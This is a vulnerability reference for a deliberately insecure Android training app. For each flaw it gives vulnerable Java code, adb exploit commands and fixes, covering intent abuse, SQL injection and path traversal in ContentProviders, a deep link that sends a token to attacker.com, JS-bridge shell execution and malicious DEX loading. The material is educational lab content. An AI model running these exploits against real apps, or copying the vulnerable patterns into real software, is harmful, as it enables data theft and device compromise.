# VulnLab — Vulnerability Reference

> Full technical details for each vulnerability class. All issues are intentional.  
> Package: `com.vulnlab.insecureapp`

---

## 11.1 — Component Exposure & Insecure IPC

**File:** `AdminActivity.java`  
**CVSS:** 9.1 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**OWASP M1:** Improper Platform Usage

### Vulnerability

`AdminActivity` is declared `exported="true"` with no `android:permission` guard. Any app or ADB session can start it directly and pass arbitrary Intent extras to trigger destructive admin actions — no authentication, no caller verification.

```java
// AdminActivity.java — vulnerable pattern
String action = getIntent().getStringExtra("action");
boolean isAdmin = getIntent().getBooleanExtra("isAdmin", false);
// No check on calling UID or package — any caller accepted
performAdminAction(action);
```

### Exploit

```bash
# Trigger delete-all action as unauthenticated external caller
adb shell am start \
    -n com.vulnlab.insecureapp/.AdminActivity \
    --ez isAdmin true \
    --es action deleteAll
```

### Expected Output

Activity launches with admin privileges. Log shows:
```
VulnLab:Admin  I  [AdminActivity] isAdmin=true, action=deleteAll → performing admin action
```

### Fix

Remove `android:exported="true"` or add `android:permission="com.vulnlab.permission.ADMIN"`. Verify caller identity server-side; never trust Intent extras for authorization.

---

## 11.2 — Intent Redirection

**File:** `IntentRedirectReceiver.java`  
**CVSS:** 8.3 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N  
**OWASP M1:** Improper Platform Usage

### Vulnerability

The receiver extracts a `Parcelable` extra named `next_intent` and starts it unconditionally. An attacker can embed any `Intent` — including ones targeting non-exported components of the same app — because `startActivity` runs under the app's identity.

```java
// IntentRedirectReceiver.java — vulnerable pattern
Intent nextIntent = intent.getParcelableExtra("next_intent");
if (nextIntent != null) {
    context.startActivity(nextIntent);  // runs as com.vulnlab.insecureapp UID
}
```

### Exploit

```bash
adb shell am broadcast \
    -n com.vulnlab.insecureapp/.IntentRedirectReceiver \
    --ep next_intent "intent:#Intent;component=com.vulnlab.insecureapp/.AdminActivity;B.isAdmin=true;S.action=deleteAll;end"
```

### Fix

Validate `nextIntent.getComponent()` against an allowlist of safe destinations before forwarding. Never start a user-supplied Intent directly.

---

## 11.2 — PendingIntent Misuse

**File:** `PendingIntentActivity.java`  
**CVSS:** 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP M1:** Improper Platform Usage

### Vulnerability

A mutable `PendingIntent` wrapping an empty `Intent` is handed to an untrusted third party. The receiver can fill in any component, allowing it to start otherwise-unexportable activities under the app's identity.

```java
// PendingIntentActivity.java — vulnerable pattern
PendingIntent pi = PendingIntent.getActivity(
    this, 0,
    new Intent(),           // empty — no component locked
    PendingIntent.FLAG_MUTABLE   // 0x04000000 — receiver can mutate
);
```

### Exploit

Malicious app receives the `PendingIntent`, fills in target component, and sends it — effectively launching any activity as the victim app.

### Fix

Always use `FLAG_IMMUTABLE` for PendingIntents shared with untrusted recipients. Always specify an explicit component in the base Intent.

---

## 11.3 — ContentProvider SQL Injection

**File:** `VulnContentProvider.java`  
**CVSS:** 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**OWASP M2:** Insecure Data Storage

### Vulnerability

The `query()` method concatenates the URI path and the caller-supplied `selection` string directly into a raw SQL query. No parameterization, no allow-list.

```java
// VulnContentProvider.java — vulnerable pattern
String path = uri.getLastPathSegment();   // user-controlled
Cursor cursor = db.rawQuery(
    "SELECT * FROM " + path + " WHERE " + selection,
    null
);
```

The database is seeded with a `users` table (cleartext passwords + auth tokens) and a `secrets` table (API keys, DB credentials).

### Exploit

```bash
# Dump all users — no authentication required
adb shell content query \
    --uri content://com.vulnlab.insecureapp.provider/users

# UNION injection — exfiltrate secrets table
adb shell content query \
    --uri content://com.vulnlab.insecureapp.provider/users \
    --where "1=1 UNION SELECT key,value,null,null,null FROM secrets--"
```

### Expected Output

```
Row: 0 _id=1, username=admin, password=Admin@123!, token=eyJhbGc...
Row: 0 _id=1, key=api_key, value=sk-live-abc123secretkey456
```

### Fix

Use `SQLiteQueryBuilder` with projection map + selection args array. Never concatenate user input into SQL strings.

---

## 11.3 — ContentProvider Path Traversal

**File:** `FileVulnProvider.java`  
**CVSS:** 8.6 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP M2:** Insecure Data Storage

### Vulnerability

`openFile()` constructs a file path from a user-controlled URI segment without canonicalization, allowing directory traversal to read arbitrary files within the app's sandbox.

```java
// FileVulnProvider.java — vulnerable pattern
String fileName = uri.getLastPathSegment();      // e.g. "../../shared_prefs/vulnlab_prefs.xml"
File file = new File(getContext().getFilesDir(), fileName);
// No canonical path check — traversal succeeds
return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
```

### Exploit

```bash
# Read SharedPreferences via path traversal
adb shell content read \
    --uri "content://com.vulnlab.insecureapp.files/../../shared_prefs/vulnlab_prefs.xml"
```

### Fix

Canonicalize the resolved path and assert it starts with `getFilesDir().getCanonicalPath()` before opening.

---

## 11.4 — Deep Link Parameter Injection

**File:** `DeepLinkActivity.java`  
**CVSS:** 8.1 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N  
**OWASP M1:** Improper Platform Usage

### Vulnerability (Token Leak)

The reset token from a deep link URI is logged at `WARN` level — accessible via `adb logcat` or any app with `READ_LOGS` permission on older Android versions.

```java
String token = uri.getQueryParameter("token");
Log.w(TAG, "Reset token from deep link: " + token);
```

### Vulnerability (Open Redirect)

The `redirect` parameter is passed directly to `webView.loadUrl()`. An attacker can send a victim a crafted link that loads an attacker-controlled URL inside the app's WebView (which may have JS bridge access).

```java
String redirect = uri.getQueryParameter("redirect");
webView.loadUrl(redirect);   // no whitelist — loads anything
```

### Exploit

```bash
# Steal token + trigger open redirect to attacker server
adb shell am start \
    -a android.intent.action.VIEW \
    -d "vulnlab://app/reset?token=SECRET_TOKEN&redirect=http://attacker.com/steal"
```

### Fix

Never log tokens. Validate `redirect` against an origin allowlist before loading. Use `https://` scheme with pinned hosts only.

---

## 11.5 — Broadcast Receiver Hijack

**File:** `ConfigReceiver.java`  
**CVSS:** 7.4 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N  
**OWASP M1:** Improper Platform Usage

### Vulnerability

`ConfigReceiver` is exported with no permission requirement. Any caller can send a broadcast that overwrites `api_server_url` in SharedPreferences, silently redirecting all API traffic to an attacker-controlled host.

```java
// ConfigReceiver.java — vulnerable pattern
String serverUrl = intent.getStringExtra("server_url");
// No sender verification, no signature check
prefs.edit().putString("api_server_url", serverUrl).apply();
```

### Exploit

```bash
# Redirect all API traffic to attacker server
# Note: explicit component required on Android 8+ (implicit broadcasts blocked)
adb shell am broadcast \
    -n com.vulnlab.insecureapp/.ConfigReceiver \
    --es server_url "http://attacker.com" \
    --ez force_update true
```

### Expected Output

```
VulnLab:Config  I  [ConfigReceiver] Server URL updated to: http://attacker.com
```

### Fix

Protect with `android:permission` on the receiver declaration. Validate the URL against an allowlist of trusted domains. Consider using signed configuration updates.

---

## 11.6 — Insecure Data Storage

**File:** `StorageActivity.java`  
**CVSS:** 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP M2:** Insecure Data Storage

### Vulnerability Patterns

**1. Cleartext SharedPreferences**
```java
prefs.edit()
    .putString("admin_password", "Admin@123!")
    .putString("auth_token", "eyJhbGciOiJIUzI1NiJ9...")
    .putString("api_key", "sk-live-abc123secretkey456")
    .apply();
```

**2. World-accessible external storage**
```java
// Written to /sdcard/Android/data/com.vulnlab.insecureapp/files/session.json
JSONObject session = new JSONObject();
session.put("user", "admin");
session.put("token", authToken);
session.put("api_key", apiKey);
```

**3. Cleartext private key file**
```java
// Written to internal files dir — but readable via run-as on debuggable app
String pemKey = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...";
FileOutputStream fos = openFileOutput("private_key.pem", MODE_PRIVATE);
```

**4. Credential leaks to logcat**
```java
Log.d("VulnLab:Storage", "Stored credentials: admin / Admin@123!");
Log.d("VulnLab:Storage", "API Key: " + apiKey);
```

### Exploit

```bash
# Read SharedPreferences (no root — works because debuggable=true)
adb shell run-as com.vulnlab.insecureapp \
    cat /data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml

# Read external storage JSON (no permissions required)
adb shell cat /sdcard/Android/data/com.vulnlab.insecureapp/files/session.json

# Dump SQLite database
adb shell run-as com.vulnlab.insecureapp \
    sqlite3 /data/data/com.vulnlab.insecureapp/databases/vulnlab.db .dump

# Read private key
adb shell run-as com.vulnlab.insecureapp \
    cat /data/data/com.vulnlab.insecureapp/files/private_key.pem

# Grep credentials from logcat
adb logcat | grep "VulnLab:Storage"
```

### Fix

Use Android Keystore for key material. Use `EncryptedSharedPreferences` from Jetpack Security. Never write credentials to external storage or logcat.

---

## 11.7 — Cryptography Failures

**File:** `CryptoActivity.java`  
**CVSS:** 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**OWASP M5:** Insufficient Cryptography

### Vulnerability Patterns

**1. AES/ECB — hardcoded key, no IV, leaks patterns**
```java
private static final String AES_KEY = "hardcoded1234567";
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
SecretKeySpec key = new SecretKeySpec(AES_KEY.getBytes(), "AES");
```

**2. AES/CBC — static all-zero IV**
```java
byte[] iv = new byte[16];   // all zeros — deterministic
IvParameterSpec ivSpec = new IvParameterSpec(iv);
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
```

**3. MD5 password hashing — no salt, broken algorithm**
```java
MessageDigest md = MessageDigest.getInstance("MD5");
String hash = bytesToHex(md.digest(password.getBytes()));
```

**4. Weak random — seeded with system time**
```java
Random rng = new Random(System.currentTimeMillis());
String token = Long.toHexString(rng.nextLong());
```

**5. Disabled hostname verifier (MITM)**
```java
HttpsURLConnection.setDefaultHostnameVerifier(new AllowAllHostnameVerifier());
```

### Exploit

```bash
adb shell am start -n com.vulnlab.insecureapp/.CryptoActivity
adb logcat | grep "VulnLab:Crypto"
# Output shows:
#   AES/ECB ciphertext (same plaintext → same ciphertext — ECB penguin)
#   AES/CBC with static IV (deterministic)
#   MD5 hash (rainbow-table crackable)
#   Weak token (predictable with known timestamp)
```

### Fix

Use AES/GCM with a random 96-bit IV per encryption. Use Argon2 or PBKDF2 (≥ 100k iterations, random salt) for passwords. Use `SecureRandom` for tokens. Always validate hostnames.

---

## 11.8 — Insecure WebView + JavaScript Bridge

**File:** `WebViewActivity.java`  
**CVSS:** 9.3 (Critical) — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N  
**OWASP M1:** Improper Platform Usage

### Vulnerability

All WebView security restrictions are disabled. A JavaScript bridge (`AppBridge`) exposed as `Android` provides three powerful methods callable from any loaded page:

```java
// WebViewActivity.java — all dangerous settings enabled
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
webView.addJavascriptInterface(new AppBridge(this), "Android");
```

```java
// AppBridge — exposed JS methods
@JavascriptInterface
public String readFile(String path) { /* reads arbitrary file */ }

@JavascriptInterface
public String getAuthToken() { /* returns stored auth token */ }

@JavascriptInterface
public String execCommand(String cmd) { /* runs shell command via Runtime.exec() */ }
```

### Exploit

```bash
# Create PoC HTML that calls all three bridge methods
cat > /tmp/poc.html << 'EOF'
<script>
  var cmd   = Android.execCommand("id");
  var prefs = Android.readFile("/data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml");
  var token = Android.getAuthToken();
  document.body.innerHTML = "<pre>CMD: "+cmd+"\nPREFS:\n"+prefs+"\nTOKEN: "+token+"</pre>";
</script>
EOF

# Push to app-internal directory (Android 13 scoped storage — /sdcard/ blocked for file:// URLs)
adb push /tmp/poc.html /data/local/tmp/poc.html
adb shell run-as com.vulnlab.insecureapp \
    cp /data/local/tmp/poc.html /data/data/com.vulnlab.insecureapp/files/poc.html

# Load via WebViewActivity
adb shell am start \
    -n com.vulnlab.insecureapp/.WebViewActivity \
    --es url "file:///data/data/com.vulnlab.insecureapp/files/poc.html"
```

### Expected Output (rendered in WebView)

```
CMD: uid=10123(u0_a123) gid=10123(u0_a123) groups=...
PREFS:
<?xml version='1.0'?>
<map>
  <string name="admin_password">Admin@123!</string>
  <string name="auth_token">eyJhbGciOiJIUzI1NiJ9...</string>
...
TOKEN: eyJhbGciOiJIUzI1NiJ9...
```

### Fix

Disable JavaScript unless required. Never use `addJavascriptInterface` on API < 17. Remove `execCommand`. For remote URLs, use a strict Content Security Policy. Validate file:// origins.

---

## 11.9 — Dynamic Code Loading

**File:** `DynamicCodeActivity.java`  
**CVSS:** 8.8 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H  
**OWASP M7:** Client Code Quality

### Vulnerability

The app loads a DEX file from `/sdcard/vulnlab_plugins/update.dex` at runtime using `DexClassLoader` with no signature verification, no integrity check, and no origin validation. External storage is world-writable.

```java
// DynamicCodeActivity.java — vulnerable pattern
String dexPath = Environment.getExternalStorageDirectory() + "/vulnlab_plugins/update.dex";
DexClassLoader loader = new DexClassLoader(
    dexPath,
    getDir("dex_opt", MODE_PRIVATE).getAbsolutePath(),
    null,
    getClassLoader()
);
Class<?> pluginClass = loader.loadClass("com.vulnlab.plugin.UpdatePlugin");
Object plugin = pluginClass.newInstance();
// Executes arbitrary code as the app's UID
pluginClass.getMethod("run").invoke(plugin);
```

### Exploit

```bash
# 1. Create malicious DEX implementing UpdatePlugin interface
#    (see docs/ for sample malicious plugin source)

# 2. Push malicious DEX to watched location
adb shell mkdir -p /sdcard/vulnlab_plugins
adb push malicious.dex /sdcard/vulnlab_plugins/update.dex

# 3. Trigger dynamic loading
adb shell am start -n com.vulnlab.insecureapp/.DynamicCodeActivity
# → malicious code executes as com.vulnlab.insecureapp
```

### Fix

Never load code from user-writable storage. If plugins are required, embed them in the APK or download from an HTTPS endpoint and verify with a hardcoded public key signature before loading.

---

## Manifest-Level Flags

All flags are intentionally set for lab use:

| Flag | Value | Risk |
|---|---|---|
| `android:debuggable` | `true` | `run-as` without root, JDWP attach, heap dump |
| `android:allowBackup` | `true` | `adb backup` extracts full app data without root |
| `android:usesCleartextTraffic` | `true` | HTTP traffic not blocked — Burp without root certs |
| Network Security Config | user CAs trusted | Burp/mitmproxy CA works without system cert install |
| `targetSdkVersion` | 28 | Pre-API-31 exported defaults, fewer restrictions |

### Exploit

```bash
# Full app data backup (no root required)
adb backup -f vulnlab_backup.ab -noapk com.vulnlab.insecureapp
java -jar abe.jar unpack vulnlab_backup.ab vulnlab_backup.tar
tar xf vulnlab_backup.tar
# Contains: shared_prefs/, databases/, files/
```
